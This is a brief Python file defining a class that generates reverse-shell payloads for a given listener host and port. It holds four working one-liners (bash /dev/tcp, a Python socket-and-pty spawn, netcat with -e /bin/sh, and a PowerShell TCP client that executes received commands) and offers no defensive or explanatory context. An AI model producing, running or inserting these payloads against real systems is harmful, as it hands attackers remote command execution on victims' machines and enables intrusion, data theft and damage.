class ReverseShellPayloads:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def generate(self):
        return [
            f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1",
            f"python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            f"nc -e /bin/sh {self.lhost} {self.lport}",
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        ]